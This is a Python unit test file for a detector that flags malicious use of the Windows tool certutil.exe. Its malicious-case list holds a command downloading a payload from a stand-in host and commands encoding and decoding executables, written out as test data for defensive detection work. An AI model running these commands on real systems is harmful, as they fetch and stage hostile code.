import unittest
from unittest.mock import patch
from detector import is_lolbin_malicious

class TestDetector(unittest.TestCase):
    
    def test_certutil_malicious_detection(self):
        # Test cases for malicious certutil.exe usage
        malicious_cases = [
            "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
            "certutil.exe -decode encoded.txt decoded.exe",
            "certutil -encode malware.exe encoded.txt"
        ]
        
        for cmd in malicious_cases:
            with self.subTest(cmd=cmd):
                result = is_lolbin_malicious("certutil.exe", cmd)
                self.assertTrue(result, f"Failed to detect malicious use: {cmd}")
    
    def test_certutil_legitimate_detection(self):
        # Test cases for legitimate certutil.exe usage
        legitimate_cases = [
            "certutil.exe -verify certificate.cer",
            "certutil.exe -viewstore -user My"
        ]
        
        for cmd in legitimate_cases:
            with self.subTest(cmd=cmd):
                result = is_lolbin_malicious("certutil.exe", cmd)
                self.assertFalse(result, f"Incorrectly flagged legitimate use: {cmd}")

if __name__ == "__main__":
    unittest.main()
